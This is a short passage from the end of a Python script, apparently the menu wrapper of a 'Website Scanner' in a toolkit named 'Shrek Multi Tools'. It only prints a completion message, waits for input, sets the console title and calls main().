    info('Scan finished! Check output/ for reports.')
    input_prompt('Press Enter to return')

def run():
    clear_screen()
    set_console_title('Website Scanner | Shrek Multi Tools')
    main()

if __name__ == '__main__':
    run()